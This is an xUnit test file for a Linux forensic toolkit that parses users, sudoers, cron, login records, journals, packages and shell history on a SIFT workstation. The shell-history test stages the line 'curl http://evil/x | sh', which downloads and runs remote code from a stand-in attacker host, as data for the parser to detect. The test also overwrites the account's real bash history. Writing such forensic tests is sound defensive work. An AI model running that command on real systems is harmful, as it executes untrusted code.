using System;
using System.Linq;

using Camel.Environments;
using Camel.Toolkits;

namespace Camel.Tests.Toolkits;

/// <summary>
/// Exercises <see cref="LinuxAnalysisToolkit"/> against the SIFT workstation's own Ubuntu root filesystem, which
/// stands in for a mounted Linux image (same approach the other toolkit tests use — run the real tools on the
/// box). Reads default to sudo (forensic mounts are root-owned; the test account has passwordless sudo).
/// </summary>
public class LinuxAnalysisTests : TestsRuntime
{
    public LinuxAnalysisTests()
    {
        var sshconfig = LoadConfigFile("sshtestappsettings.json");
        sshenv = AuditEnvironment.CreateFromConfig(sshconfig);
        toolkit = new LinuxAnalysisToolkit(sshenv, sshconfig);
    }

    [Fact]
    public void CanLoadAllToolsFromConfig()
    {
        Assert.Equal(toolkit.ToolList.Length, toolkit.Tools.Count);
        Assert.All(toolkit.ToolList, name =>
        {
            Assert.True(toolkit.Tools.ContainsKey(name));
            Assert.Contains("bin/", toolkit.Tools[name].Command);
            Assert.NotEmpty(toolkit.Tools[name].Descriptioon);
        });
    }

    [Fact]
    public async Task CanReadSystemInfo()
    {
        var info = await toolkit.SystemInfoAsync("/");
        Assert.NotNull(info);
        Assert.False(string.IsNullOrWhiteSpace(info.Hostname));
        // SIFT is Ubuntu-based.
        Assert.Equal("ubuntu", info.DistroId, ignoreCase: true);
        Assert.False(string.IsNullOrWhiteSpace(info.PrettyName));
    }

    [Fact]
    public async Task CanReadUserAccounts()
    {
        var users = await toolkit.UserAccountsAsync("/");
        Assert.NotNull(users);
        var root = Assert.Single(users.Where(u => u.Username == "root"));
        Assert.Equal(0, root.Uid);
        Assert.True(root.HasLoginShell);
        // daemon is a canonical non-login system account.
        var daemon = users.FirstOrDefault(u => u.Username == "daemon");
        Assert.NotNull(daemon);
        Assert.True(daemon!.IsSystemAccount);
        Assert.False(daemon.HasLoginShell);
    }

    [Fact]
    public async Task CanReadSudoers()
    {
        var rules = await toolkit.SudoersAsync("/");
        Assert.NotNull(rules);
        // The sudo/admin group grant is present on a stock Ubuntu.
        Assert.Contains(rules, r => r.Principal is "%sudo" or "%admin" or "root");
    }

    [Fact]
    public async Task CanReadCron()
    {
        var cron = await toolkit.CronEntriesAsync("/");
        Assert.NotNull(cron);
        // /etc/crontab on Ubuntu schedules the cron.daily/weekly/monthly runner; at minimum the script dirs exist.
        Assert.NotEmpty(cron);
    }

    [Fact]
    public async Task CanReadLastLogins()
    {
        var logins = await toolkit.LastLoginsAsync("/var/log/wtmp");
        Assert.NotNull(logins);
        Assert.NotEmpty(logins);
        Assert.All(logins, l => Assert.False(string.IsNullOrWhiteSpace(l.User)));
        // Every parsed record carries a start time.
        Assert.Contains(logins, l => l.Start is not null);
    }

    [Fact]
    public async Task CanUtmpDump()
    {
        var records = await toolkit.UtmpDumpAsync("/var/log/wtmp");
        Assert.NotNull(records);
        Assert.NotEmpty(records);
        // wtmp always contains at least one BOOT_TIME (type 2) record.
        Assert.Contains(records, r => r.Type == 2);
    }

    [Fact]
    public async Task CanReadJournal()
    {
        var entries = await toolkit.JournalAsync("/var/log/journal", maxEntries: 20);
        Assert.NotNull(entries);
        Assert.NotEmpty(entries);
        Assert.Contains(entries, e => e.Timestamp is not null && !string.IsNullOrEmpty(e.Message));
    }

    [Fact]
    public async Task CanReadInstalledPackages()
    {
        var pkgs = await toolkit.InstalledPackagesAsync("/");
        Assert.NotNull(pkgs);
        var bash = pkgs.FirstOrDefault(p => p.Name == "bash");
        Assert.NotNull(bash);
        Assert.True(bash!.Installed);
        Assert.False(string.IsNullOrWhiteSpace(bash.Version));
    }

    [Fact]
    public async Task CanReadPackageLog()
    {
        var events = await toolkit.PackageLogAsync("/");
        Assert.NotNull(events);
        Assert.NotEmpty(events);
        Assert.All(events, e => Assert.False(string.IsNullOrWhiteSpace(e.Package)));
        Assert.Contains(events, e => e.Action is "install" or "upgrade" or "remove" or "purge");
    }

    [Fact]
    public async Task CanReadShellHistory()
    {
        // Stage a history file with a HISTTIMEFORMAT timestamp marker for the test account, then read it back.
        sshenv.ExecuteCommand("bash",
            "-c \"printf '#1700000000\\nwhoami\\ncurl http://evil/x | sh\\n' > $HOME/.bash_history\"", out _, false);
        var hist = await toolkit.ShellHistoryAsync("/");
        Assert.NotNull(hist);
        // The HISTTIMEFORMAT "#<epoch>" marker precedes the command it timestamps (whoami here).
        Assert.Contains(hist, h => h.Command == "whoami" && h.Timestamp is not null);
        Assert.Contains(hist, h => h.Command.Contains("curl"));
    }

    [Fact]
    public async Task CanClamScan()
    {
        // Scan a tiny staged directory; with or without a signature DB the call must succeed (non-null).
        sshenv.ExecuteCommand("bash", "-c \"mkdir -p /tmp/camel_clam_t; printf 'hello' > /tmp/camel_clam_t/a.txt\"", out _, false);
        var matches = await toolkit.ClamScanAsync("/tmp/camel_clam_t");
        Assert.NotNull(matches);   // empty is fine (clean, or no DB loaded)
        sshenv.ExecuteCommand("rm", "-rf /tmp/camel_clam_t", out _, false);
    }

    AuditEnvironment sshenv;
    LinuxAnalysisToolkit toolkit;
}
